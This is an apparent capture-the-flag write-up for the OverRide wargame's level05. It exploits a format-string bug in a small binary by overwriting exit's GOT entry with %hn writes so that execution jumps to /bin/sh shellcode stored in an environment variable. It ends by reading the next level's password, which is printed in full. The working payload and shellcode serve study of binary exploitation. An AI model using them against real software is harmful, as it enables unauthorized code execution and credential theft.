    level05@OverRide:~$ ./level05
    whoami
    whoami

***

    level05@OverRide:~$ ltrace ./level05
    __libc_start_main(0x8048444, 1, -10300, 0x8048520, 0x8048590 <unfinished ...>
    fgets(whoami
    "whoami\n", 100, 0xf7fcfac0)                                                                        = 0xffffd6b8
    printf("whoami\n"whoami
    )                                                                                        = 7
    exit(0 <unfinished ...>
    +++ exited (status 0) +++

***

    (gdb) disass main
    Dump of assembler code for function main:
    0x08048444 <+0>:     push   %ebp
    0x08048445 <+1>:     mov    %esp,%ebp
    0x08048447 <+3>:     push   %edi
    0x08048448 <+4>:     push   %ebx
    0x08048449 <+5>:     and    $0xfffffff0,%esp
    0x0804844c <+8>:     sub    $0x90,%esp              // 0x90 = 144
    0x08048452 <+14>:    movl   $0x0,0x8c(%esp)         // 0x8c = 140
    0x0804845d <+25>:    mov    0x80497f0,%eax          // stdin
    0x08048462 <+30>:    mov    %eax,0x8(%esp)
    0x08048466 <+34>:    movl   $0x64,0x4(%esp)         // 0x64 = 100
    0x0804846e <+42>:    lea    0x28(%esp),%eax         // 0x28 = 40
    0x08048472 <+46>:    mov    %eax,(%esp)
    0x08048475 <+49>:    call   0x8048350 <fgets@plt>
    0x0804847a <+54>:    movl   $0x0,0x8c(%esp)
    0x08048485 <+65>:    jmp    0x80484d3 <main+143>
    0x08048487 <+67>:    lea    0x28(%esp),%eax
    0x0804848b <+71>:    add    0x8c(%esp),%eax
    0x08048492 <+78>:    movzbl (%eax),%eax
    0x08048495 <+81>:    cmp    $0x40,%al               // 0x40 = '@'
    0x08048497 <+83>:    jle    0x80484cb <main+135>
    0x08048499 <+85>:    lea    0x28(%esp),%eax
    0x0804849d <+89>:    add    0x8c(%esp),%eax
    0x080484a4 <+96>:    movzbl (%eax),%eax
    0x080484a7 <+99>:    cmp    $0x5a,%al               // 0x5a = 'Z'
    0x080484a9 <+101>:   jg     0x80484cb <main+135>
    0x080484ab <+103>:   lea    0x28(%esp),%eax
    0x080484af <+107>:   add    0x8c(%esp),%eax
    0x080484b6 <+114>:   movzbl (%eax),%eax
    0x080484b9 <+117>:   mov    %eax,%edx
    0x080484bb <+119>:   xor    $0x20,%edx              // 0x20 = 32
    0x080484be <+122>:   lea    0x28(%esp),%eax
    0x080484c2 <+126>:   add    0x8c(%esp),%eax
    0x080484c9 <+133>:   mov    %dl,(%eax)
    0x080484cb <+135>:   addl   $0x1,0x8c(%esp)
    0x080484d3 <+143>:   mov    0x8c(%esp),%ebx
    0x080484da <+150>:   lea    0x28(%esp),%eax
    0x080484de <+154>:   movl   $0xffffffff,0x1c(%esp)
    0x080484e6 <+162>:   mov    %eax,%edx
    0x080484e8 <+164>:   mov    $0x0,%eax
    0x080484ed <+169>:   mov    0x1c(%esp),%ecx
    0x080484f1 <+173>:   mov    %edx,%edi
    0x080484f3 <+175>:   repnz scas %es:(%edi),%al      // strlen
    0x080484f5 <+177>:   mov    %ecx,%eax
    0x080484f7 <+179>:   not    %eax
    0x080484f9 <+181>:   sub    $0x1,%eax
    0x080484fc <+184>:   cmp    %eax,%ebx
    0x080484fe <+186>:   jb     0x8048487 <main+67>
    0x08048500 <+188>:   lea    0x28(%esp),%eax
    0x08048504 <+192>:   mov    %eax,(%esp)
    0x08048507 <+195>:   call   0x8048340 <printf@plt>
    0x0804850c <+200>:   movl   $0x0,(%esp)
    0x08048513 <+207>:   call   0x8048370 <exit@plt>
    End of assembler dump.

***

This program basically takes string from stdin into buffer of size 100 and converts it to lowercase (A-Z -> a-z) and then prints it back.
We are throwing buffer straight into printf. It works as expected when the input is normal text but if the input is C format strings.

For example this way we get hexadecimal values from the stack:

***

    level05@OverRide:~$ ./level05
    %x%x%x%x
    64f7fcfac0f7ec3af9ffffd6df

***

Let's use it to find offset of input string on stack. `aaaa` if hex is 61616161:

***

    level05@OverRide:~$ ./level05
    aaaa %x %x %x %x %x %x %x %x %x %x %x
    aaaa 64 f7fcfac0 f7ec3af9 ffffd6df ffffd6de 0 ffffffff ffffd764 f7fdb000 61616161 20782520

***

Offset = 10

%x -> Output Hexadecimal Number
%n -> Writes the number of bytes till the format string to memory

Another point of vulnerability is exit function. 

In order to conserve RAM programs share libraries and that means that memory location of a library routine varies and PLT (Procedure Linkage Table) and GOT (Global Offset Table) are used to hold the current addresses of library functions.

We can see Dynamic Relocation entries with objdump:

***

    level05@OverRide:~$ objdump -R level05

    level05:     file format elf32-i386

    DYNAMIC RELOCATION RECORDS
    OFFSET   TYPE              VALUE
    080497c4 R_386_GLOB_DAT    __gmon_start__
    080497f0 R_386_COPY        stdin
    080497d4 R_386_JUMP_SLOT   printf
    080497d8 R_386_JUMP_SLOT   fgets
    080497dc R_386_JUMP_SLOT   __gmon_start__
    080497e0 R_386_JUMP_SLOT   exit
    080497e4 R_386_JUMP_SLOT   __libc_start_main

***

The address of "exit" is stored at 0x080497e0. If we can write to that address, we can take over the program's execution when it calls "exit@plt".

Now we should put shellcode to open bash into env variable and find its address:

***

    export EGG=$(python -c "print '\x90' * 70 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")

    level05@OverRide:~$ gdb level05
    (gdb) b main
    Breakpoint 1 at 0x8048449
    (gdb) r
    Starting program: /home/users/level05/level05

    Breakpoint 1, 0x08048449 in main ()
    (gdb) x/10s *((char**)environ)
    [...]
    0xffffd8e2:      "EGG=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341Qh//shh/bin\211\343\260\v̀"
    [...]

***

Shellcode EGG is at address 0xffffd8e2 + 10(offset) = 0xffffd8ec

We are going to print shellcode EGG at exit: 4 lower bytes 0xd8ec (decimal 55532) at 0x080497e0 and 4 higher bytes  0xffff (decimal 65535) at 0x080497e2

But we will need to move this addresses around (%hn means to not write only a short value (usually 2 bytes) at the given address):

***

    level05@OverRide:~$ python -c "print '\xe0\x97\x04\x08NOPE\xe2\x97\x04\x08' + '%x' * 8 + '%0x%hn'" > /tmp/lvl5
    level05@OverRide:~$ gdb level05
    (gdb) r < /tmp/lvl5
    Starting program: /home/users/level05/level05 < /tmp/lvl5
    �nope�64f7fcfac0f7ec3af9ffffd65fffffd65e0ffffffffffffd6e40

    Program received signal SIGSEGV, Segmentation fault.
    0x08040040 in ?? ()
    (gdb) p (0xd8ec - 0x0040) + 1
    $1 = 55469

    python -c "print '\xe0\x97\x04\x08NOPE\xe2\x97\x04\x08' + '%x' * 8 + '%55469x%hn%0x%hn'" > /tmp/lvl5
    [...]
    Program received signal SIGSEGV, Segmentation fault.
    0xd8f4d8ec in ?? ()
    (gdb) p (0xffff - 0xd8f4) + 8
    $1 = 10003

***

We have our offsets for low and high parts of address and it is time to try them:

***

    (python -c "print '\xe0\x97\x04\x08NOPE\xe2\x97\x04\x08' + '%x' * 8 + '%55469x%hn%10003x%hn'" ; cat -) | ./level05
    whoami
    level06
    cat /home/users/level06/.pass
    h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
